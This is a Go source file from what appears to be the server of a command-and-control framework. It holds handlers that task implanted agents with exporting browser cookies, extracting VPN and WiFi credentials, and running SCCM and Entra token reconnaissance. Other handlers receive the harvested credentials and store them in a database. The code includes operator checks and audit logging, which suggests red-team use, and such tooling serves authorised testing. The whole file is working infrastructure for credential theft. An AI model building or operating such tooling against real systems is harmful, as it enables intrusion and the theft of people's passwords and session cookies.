package server

import (
	"fmt"
	"log/slog"
	"net/http"
	"strings"

	"github.com/forgec2/forgec2/internal/db"
	"github.com/gin-gonic/gin"
	"gorm.io/gorm"
)

// handleCookieExport dispatches cookie_export task to the agent.
func (s *Server) handleCookieExport(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	browser := c.PostForm("browser")
	if browser == "" {
		browser = c.Query("browser")
	}
	if browser == "" {
		browser = "all"
	}
	task := s.issueAgentTask(c, id, TaskSpec{Type: "cookie_export", Command: browser})
	if task == nil {
		return
	}
	s.LogAuditRecord(c, "cookie_export", "agent", id, "Cookie export: "+browser, true, nil)
	s.dispatchTask(c, task, "cookie_export", "Cookie export: "+browser)
}

func (s *Server) handleSccmRecon(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	task := s.issueAgentTask(c, id, TaskSpec{Type: "sccm_recon"})
	if task == nil {
		return
	}
	s.dispatchTask(c, task, "sccm_recon", "SCCM/MECM recon")
}

func (s *Server) handleEntraPRT(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	task := s.issueAgentTask(c, id, TaskSpec{Type: "entra_prt"})
	if task == nil {
		return
	}
	s.dispatchTask(c, task, "entra_prt", "Entra PRT recon")
}

// handleVpnCreds dispatches vpn_creds task to the agent.
func (s *Server) handleVpnCreds(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	task := s.issueAgentTask(c, id, TaskSpec{Type: "vpn_creds"})
	if task == nil {
		return
	}
	s.LogAuditRecord(c, "vpn_creds", "agent", id, "VPN credential extraction", true, nil)
	s.dispatchTask(c, task, "vpn_creds", "VPN credential extraction")
}

// handleWifiCreds handles WiFi credential extraction
func (s *Server) handleWifiCreds(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	agentID := c.Param("id")

	// Route through issueAgentTask like every sibling collector: the bare
	// Create used to skip the tenant scope, the agent-existence check and
	// the approval/lock gates inside createTask.
	task := s.issueAgentTask(c, agentID, TaskSpec{Type: "wifi_creds", Command: "wifi_creds:all"})
	if task == nil {
		return
	}

	// Log audit
	s.LogAuditRecord(c, "wifi_credential_extraction",
		fmt.Sprintf("WiFi credential extraction task %d created", task.ID),
		agentID, "Extracting all saved WiFi profiles and passwords",
		true, nil)

	respond(c, gin.H{
		"task_id": task.ID,
		"message": "WiFi credential extraction started",
	})
}

// handleProcessBrowserResult processes browser credential results from agent
func (s *Server) handleProcessBrowserResult(c *gin.Context) {
	var req struct {
		TaskID      uint     `json:"task_id"`
		AgentID     string   `json:"agent_id"`
		Credentials []string `json:"credentials"` // JSON array of credential strings
	}

	if err := c.ShouldBindJSON(&req); err != nil {
		respondError(c, http.StatusBadRequest, "invalid request")
		return
	}

	// Resolve the owning tenant once instead of letting the per-row write
	// hook re-SELECT it for every credential.
	tenantID := s.agentTenantID(req.AgentID)

	// Parse and store credentials
	var entries []db.CredentialEntry
	for _, credStr := range req.Credentials {
		// Expected format: browser|url|username|password|cookie_data
		// This will be parsed by the agent and sent in structured format
		notes, err := encryptCredNotes(credStr)
		if err != nil {
			// Fail-closed: a vault failure must not store harvested
			// credentials as plaintext. The entry is skipped and the
			// created count below reports the shortfall.
			slog.Error("Browser credential dropped, vault encryption failed", "agent_id", req.AgentID, "task_id", req.TaskID, "err", err)
			continue
		}
		entries = append(entries, db.CredentialEntry{
			AgentID:  req.AgentID,
			Source:   "browser",
			Type:     "cleartext",
			TaskID:   req.TaskID,
			Notes:    notes,
			TenantID: tenantID,
		})
	}

	// Per-row skip-on-error semantics are preserved, but the inserts commit
	// together in one transaction instead of N individually-committed
	// round trips on the single-writer pool.
	created := 0
	if err := s.db.Transaction(func(tx *gorm.DB) error {
		for i := range entries {
			if e := tx.Create(&entries[i]).Error; e != nil {
				slog.Warn("Browser credential dropped", "agent_id", req.AgentID, "task_id", req.TaskID, "err", e)
				continue
			}
			created++
		}
		return nil
	}); err != nil {
		slog.Warn("Browser credential ingest transaction aborted", "agent_id", req.AgentID, "err", err)
	}

	// Update task
	if err := s.db.Model(&db.Task{}).Where("id = ?", req.TaskID).Updates(map[string]interface{}{
		"status": "completed",
		"result": fmt.Sprintf("Extracted %d browser credentials", created),
	}).Error; err != nil {
		slog.Error("Failed to update browser creds task", "task_id", req.TaskID, "err", err)
	}

	respond(c, gin.H{
		"created": created,
		"message": fmt.Sprintf("Stored %d browser credentials", created),
	})
}

// handleProcessWifiResult processes WiFi credential results
func (s *Server) handleProcessWifiResult(c *gin.Context) {
	var req struct {
		TaskID   uint     `json:"task_id"`
		AgentID  string   `json:"agent_id"`
		Networks []string `json:"networks"` // SSID:Password format
	}

	if err := c.ShouldBindJSON(&req); err != nil {
		respondError(c, http.StatusBadRequest, "invalid request")
		return
	}

	// Resolve the owning tenant once instead of letting the per-row write
	// hook re-SELECT it for every credential.
	tenantID := s.agentTenantID(req.AgentID)

	// Parse and store WiFi credentials
	var entries []db.CredentialEntry
	for _, network := range req.Networks {
		// Format: SSID:Password — limit to 2 so colons in password aren't lost
		parts := strings.SplitN(network, ":", 2)
		if len(parts) < 2 {
			continue
		}
		ssid := strings.TrimSpace(parts[0])
		password := strings.TrimSpace(parts[1])

		entries = append(entries, db.CredentialEntry{
			AgentID:  req.AgentID,
			Username: ssid,
			Password: password,
			Source:   "wifi",
			Type:     "cleartext",
			TaskID:   req.TaskID,
			TenantID: tenantID,
		})
	}

	// One commit for the whole result instead of N individually-committed
	// inserts on the single-writer pool.
	created := 0
	if err := s.db.Transaction(func(tx *gorm.DB) error {
		for i := range entries {
			if e := tx.Create(&entries[i]).Error; e != nil {
				slog.Warn("WiFi credential dropped", "agent_id", req.AgentID, "task_id", req.TaskID, "err", e)
				continue
			}
			created++
		}
		return nil
	}); err != nil {
		slog.Warn("WiFi credential ingest transaction aborted", "agent_id", req.AgentID, "err", err)
	}

	// Update task
	if err := s.db.Model(&db.Task{}).Where("id = ?", req.TaskID).Updates(map[string]interface{}{
		"status": "completed",
		"result": fmt.Sprintf("Extracted %d WiFi credentials", created),
	}).Error; err != nil {
		slog.Error("Failed to update wifi creds task", "task_id", req.TaskID, "err", err)
	}

	respond(c, gin.H{
		"created": created,
		"message": fmt.Sprintf("Stored %d WiFi credentials", created),
	})
}
